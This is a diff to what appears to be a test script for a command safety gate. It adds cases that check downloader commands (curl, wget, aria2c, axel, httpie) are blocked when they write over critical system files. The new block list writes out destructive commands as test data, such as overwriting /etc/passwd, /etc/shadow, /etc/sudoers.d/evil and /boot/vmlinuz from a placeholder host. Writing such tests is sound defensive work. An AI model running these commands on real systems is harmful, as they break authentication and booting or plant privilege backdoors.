@@ -191,5 +191,62 @@ allows([
 ], "still allowed")
 
 
+# ── CLASS 5: the DOWNLOADER writing over a critical file ──
+#
+# Class 1 classified what a command does to its DESTINATION — but it enumerated
+# the copiers (cp/install/mv/ln/truncate/tee/dd) and stopped there.  The tools
+# this app reaches for most often, curl and wget, take a destination too, and
+# they were not on the list.  So the whole class 1 argument applied and the rule
+# simply did not run:  `curl -o /etc/passwd http://x/p` replaces the file the
+# system cannot be repaired without, and the gate said yes.
+#
+# The flag has four spellings per tool (-o, -O, --output, --output=), and the
+# equals form is the one that slips a space-separated parser.
+print("\n== class 5: a downloader clobbering a boot/auth-critical file ==")
+catches([
+    "curl -o /etc/passwd http://x/p",
+    "curl -O /etc/shadow http://x/p",
+    "curl --output /etc/shadow http://x/s",
+    "curl --output=/etc/sudoers http://x/s",
+    "curl -sSL --output /etc/crypttab http://x/c",
+    "curl -o '/etc/passwd' http://x/p",
+    "curl -o /etc/pam.d/sudo http://x/e",
+    "curl -o /etc/sudoers.d/evil http://x/e",
+    "wget -O /boot/vmlinuz http://x/k",
+    "wget --output-document=/etc/passwd http://x/p",
+    "wget --output-document /etc/gshadow http://x/g",
+    "wget --output-file=/etc/fstab http://x/f",
+    "wget2 -O /etc/passwd http://x/p",
+    "aria2c -o /etc/passwd http://x/p",
+    "axel -o /etc/shadow http://x/s",
+    "http --output /etc/passwd http://x/p",
+    "httpie --output /boot/grub/grub.cfg http://x/g",
+], "caught")
+
+# The scope line again, and it is a wide one: downloading TO a path is the
+# single most ordinary thing this tool does.  /etc/hosts, /etc/resolv.conf and
+# sshd_config are deliberately NOT critical files — mapping a target hostname
+# and hardening a box are the job.
+print("\n   -- and the downloads that must stay allowed --")
+allows([
+    "curl -o /tmp/page.html http://x/p",
+    "curl -o report.json http://x/r",
+    "curl -o ./out/scan.txt http://x/s",
+    "curl -L -o /var/tmp/payload.bin http://x/b",
+    "curl -o /home/me/notes.md http://x/n",
+    "curl -o passwd http://x/p",              # relative, not /etc/passwd
+    "curl -o /tmp/etc/passwd http://x/p",     # not the real one
+    "curl --output /etc/hosts http://x/h",    # deliberately allowed
+    "curl -o /etc/resolv.conf http://x/r",    # deliberately allowed
+    "curl -o /etc/ssh/sshd_config http://x/s",  # hardening work
+    "curl -sS https://example.com/api | jq .",
+    "wget https://example.com/file.zip",
+    "wget -O ~/loot/dump.sql http://x/d",
+    "wget -O /usr/local/share/wordlist.txt http://x/w",
+    "wget -O /opt/tools/nuclei.tar.gz http://x/n",
+    "aria2c -d /tmp -o thing.iso http://x/i",
+], "still allowed")
+
+
 print(f"\nsafety_bypass: {_p} passed, {_f} failed")
 sys.exit(1 if _f else 0)
